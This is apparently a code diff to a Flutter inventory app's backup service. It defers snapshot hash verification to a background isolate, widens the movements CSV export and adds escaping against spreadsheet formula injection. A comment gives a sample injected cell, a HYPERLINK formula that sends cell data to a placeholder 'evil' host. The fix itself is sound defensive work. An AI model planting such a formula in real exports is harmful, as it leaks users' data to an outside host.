@@ -2,12 +2,18 @@ import 'dart:convert';
 import 'dart:io';
 
 import 'package:crypto/crypto.dart';
+import 'package:flutter/foundation.dart' show compute;
 import 'package:csv/csv.dart';
 import 'package:intl/intl.dart';
 import 'package:path/path.dart' as p;
 import 'package:path_provider/path_provider.dart';
 
 import 'database.dart';
+
+/// Reads a file and returns its SHA-256. Top-level so it can be sent to an
+/// isolate by [compute].
+String _hashFile(String path) =>
+    sha256.convert(File(path).readAsBytesSync()).toString();
 
 /// Describes a snapshot: what produced it and what it should contain.
 ///
@@ -184,14 +190,23 @@ class BackupService {
     return DateTime.now().difference(lastDate).inDays >= thresholdDays;
   }
 
-  /// Lists existing snapshots with verified integrity status, newest first.
-  Future<List<SnapshotInfo>> listSnapshots() async {
+  /// Lists existing snapshots, newest first.
+  ///
+  /// [verify] re-hashes every snapshot, which means reading each one in full.
+  /// With seven copies of a 40 MB database that is 280 MB of I/O and SHA-256,
+  /// and it used to happen on the UI isolate every time the Backup screen
+  /// opened — a multi-second freeze, or an OOM kill on a low-end device, on
+  /// the one screen whose job is reassuring the user their data is safe.
+  ///
+  /// The list now shows size and date immediately from `stat()`, and
+  /// verification is deferred to the moment it matters: [verifySnapshotIntegrity]
+  /// before a restore, or an explicit check from the UI.
+  Future<List<SnapshotInfo>> listSnapshots({bool verify = false}) async {
     final dir = await _backupDir();
     if (!await dir.exists()) return [];
 
-    final files = dir
-        .listSync()
-        .whereType<File>()
+    // `list()` rather than `listSync()`: this runs on the UI isolate.
+    final files = (await dir.list().where((e) => e is File).cast<File>().toList())
         .where(_isSnapshotFile)
         .toList()
       ..sort((a, b) => b.path.compareTo(a.path));
@@ -199,13 +214,13 @@ class BackupService {
     final results = <SnapshotInfo>[];
     for (final f in files) {
       final stat = await f.stat();
-      final isVerified = await verifySnapshotIntegrity(f.path);
       results.add(SnapshotInfo(
         path: f.path,
         fileName: p.basename(f.path),
         sizeBytes: stat.size,
         modified: stat.modified,
-        isIntegrityVerified: isVerified,
+        isIntegrityVerified:
+            verify ? await verifySnapshotIntegrity(f.path) : null,
       ));
     }
     return results;
@@ -239,8 +254,9 @@ class BackupService {
       final recordedHash = await _recordedHashFor(snapshotPath);
       if (recordedHash == null) return false;
 
-      final bytes = await file.readAsBytes();
-      final actualHash = sha256.convert(bytes).toString();
+      // compute() runs the read and the hash on a background isolate, so a
+      // 40 MB database does not block the frame.
+      final actualHash = await compute(_hashFile, snapshotPath);
       return recordedHash == actualHash;
     } catch (_) {
       return false;
@@ -383,21 +399,48 @@ class BackupService {
           p.stockQty, p.createdAt.toIso8601String(), p.updatedAt.toIso8601String(),
         ],
     ];
-    return const ListToCsvConverter().convert(rows);
+    return _toCsv(rows);
   }
 
   /// Export movements to CSV — full history with every column.
+  ///
+  /// "Export stops at Buy Rate" is one of the competitor complaints this app
+  /// was built to answer, so every column means every column: `batchId` and
+  /// `supplierId` were previously dropped.
   Future<String> exportMovementsCsv() async {
     final movements = await _db.movementDao.getAllForExport();
     final rows = <List<dynamic>>[
-      ['ID', 'Product ID', 'Qty Delta', 'Reason', 'Note', 'Audit Session ID', 'Created At'],
+      [
+        'ID', 'Product ID', 'Qty Delta', 'Reason', 'Note',
+        'Batch ID', 'Supplier ID', 'Audit Session ID', 'Created At',
+      ],
       for (final m in movements)
         [
-          m.id, m.productId, m.qtyDelta, m.reason,
-          m.note ?? '', m.auditSessionId ?? '', m.createdAt.toIso8601String(),
+          m.id, m.productId, m.qtyDelta, m.reason, m.note ?? '',
+          m.batchId ?? '', m.supplierId ?? '', m.auditSessionId ?? '',
+          m.createdAt.toIso8601String(),
         ],
     ];
-    return const ListToCsvConverter().convert(rows);
+    return _toCsv(rows);
+  }
+
+  /// Converts rows to CSV with spreadsheet formulas neutralised.
+  ///
+  /// A cell beginning `=`, `+`, `-`, `@`, tab or carriage return is executed
+  /// as a formula by Excel and Google Sheets. Product names are user- and
+  /// supplier-controlled — a name like `=HYPERLINK("http://evil/"&A1,"x")`
+  /// would run when the shopkeeper opens their own export. Prefixing with an
+  /// apostrophe makes the cell text; spreadsheets hide the apostrophe.
+  static String _toCsv(List<List<dynamic>> rows) {
+    return const ListToCsvConverter().convert([
+      for (final row in rows) [for (final cell in row) _neutralise(cell)],
+    ]);
+  }
+
+  static Object? _neutralise(Object? cell) {
+    if (cell is! String || cell.isEmpty) return cell;
+    const dangerous = {'=', '+', '-', '@', '\t', '\r'};
+    return dangerous.contains(cell[0]) ? "'$cell" : cell;
   }
 
   /// Export an audit session reconciliation report to CSV.
@@ -427,7 +470,7 @@ class BackupService {
       ]);
     }
 
-    return const ListToCsvConverter().convert(rows);
+    return _toCsv(rows);
   }
 
   /// Write CSV exports to temp directory and return file paths.
@@ -481,5 +524,8 @@ class SnapshotInfo {
   final String fileName;
   final int sizeBytes;
   final DateTime modified;
-  final bool isIntegrityVerified;
+  /// Null when the snapshot has not been verified yet — distinct from false,
+  /// which means it was checked and failed. The UI must not report an
+  /// unchecked snapshot as either sound or damaged.
+  final bool? isIntegrityVerified;
 }
